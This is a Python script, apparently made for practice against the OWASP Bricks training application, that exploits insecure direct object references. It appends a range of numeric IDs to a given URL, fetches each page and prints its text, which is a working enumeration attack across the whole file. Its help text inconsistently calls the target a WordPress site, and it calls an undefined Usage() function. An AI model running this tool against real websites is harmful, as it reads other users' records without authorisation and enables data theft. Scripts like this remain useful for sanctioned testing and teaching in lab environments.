#!/usr/bin/python
#===============================================================
#  Broken Access Control Vulnerability Penetration Testing Exploit
#  Insecure Direct Object Reference (IDOR) Scanner Tested with Bricks
#  Author: Kailas PATIL
#  Email: patilkr80 [AT] gmail [DOT] com
#===============================================================

import sys, getopt
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import re
from bs4 import BeautifulSoup
import datetime

#def visible(element):
#	if element.parent.name in ['style', 'script', '[document]', 'head', 'title']:
#		return False
#	elif re.match('<!-- .* -->', str(element.encode('utf-8'))):
#		return False
#	return True


def main(argv):
	if len(sys.argv) < 2:
		print ('The required option is: --url or -u')
		print ('Please use -h for the list of available options.')
		sys.exit(1)
	websiteurl = ''
	startNum = 0
	endNum = 5
	payload = ''
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hs:e:u:",["url="])
		for opt, arg in opts:
			if opt == '-h':
				print ('_______________________________________________________________')
				print (' Broken Access Control Penetration Testing Exploit ')
				print (' Insecure Direct Object Reference (IDOR) Vulnerability Scanner Testwed with Bricks')
				print ('_______________________________________________________________')
				print (' Author: Kailas PATIL')
				print (' Email: patilkr80 [AT] gmail [DOT] com')
				print ('_______________________________________________________________')
				print (' Usage: python3 owaspBricksIDOR.py [options]')
				print ('  -h 			Display the simple help and exit')
				print ('  --url <URL>		The URL of the WordPress website to scan	')
				print ('  -u <URL>		The URL of the WordPress website to scan	')
				print ('  -s <startNumber>  	The number to begin the enumeration from. Default value:0.')
				print ('  -e <endNumber>	The number to end the enumeration. The default value:5.')
				print ('_______________________________________________________________')
				print (' Usage Examples:')
				print ('	python3 owaspBricksIDOR.py -s 0 -e 4 -u http://example.com/index.php?id=')
				print (' 	python3 owaspBricksIDOR.py -s 1 -e 3 -u http://example.com/index.php?id=')
				print ('	python3 owaspBricksIDOR.py --url http://example.com/index.php?id=')
				print ('_______________________________________________________________')
				sys.exit()
			elif opt == '-s':
				#print ('System argument list = ', sys.argv[1:])
				#print (' Opts = ', opts)
				startNum = int(arg)
				#print ('Startum = ', startNum)
			elif opt == '-e':
				endNum = int(arg)
				#print ('EndNum = ', endNum);
			elif opt in ("-u", "--url"):
				websiteurl = arg
				print ('===============================================================')
				print (' Broken Access Control Penetration testing Exploit')
				print (' Insecure Direct Object Reference (IDOR) Scanner Tested with Bricks')
				print (' Author: Kailas PATIL')
				print (' Email: patilkr80 [AT] gmail [DOT] com')
				print ('_______________________________________________________________')
				print (' WebsiteURL Provided by the User to Scan:  ', websiteurl)
				#payload = websiteurl + str(startNum)
				#print (' Payload URL is: ', payload)
				print (' Enumeration Range to scan of IDOR:')
				print ('	Start with ID = ', startNum)
				print ('	Ending ID = ', endNum)
				now = datetime.datetime.now()
				print (" Scan date and time : " + now.strftime("%Y-%m-%d %H:%M:%S"))
				print ('===============================================================')
				for k in range(startNum, (endNum+1)):
					payload = websiteurl + str(k)
					print('-------------------------------------------------------------------------')
					print(' IDOR Payload URL is: ', payload);
					req = Request(payload)
					try:
						html = urlopen(req)
						soup = BeautifulSoup(html, 'html.parser')
						for s in soup(['head', 'title', 'script', 'style', 'a', 'img']):
							s.decompose()
						result = '\n '.join(soup.stripped_strings)
						print (result)
						#data = soup.find_all(text=True)
						#result = filter(visible, data)
						#print (*result)
					except HTTPError as e:
						print(' HTTP Error Code is: ', e.code)
						print(' Error !!! HTTP Error. Unsucessful to exploit the given web URL.')
					except URLError as e:
						print (' Error!!! URL Error.  Unsuccessful to exploit the given website.')
						print('URLError: {}'.format(e.reason))
				print ('_____________________________________________________')

	except getopt.GetoptError:
		print ('owaspBricksIDOR.py -s <Number> -e <Number> -u <URL>')
		Usage()
		print ('_____________________________________________________')
		sys.exit(2)

if __name__ == "__main__":
	main(sys.argv[1:])

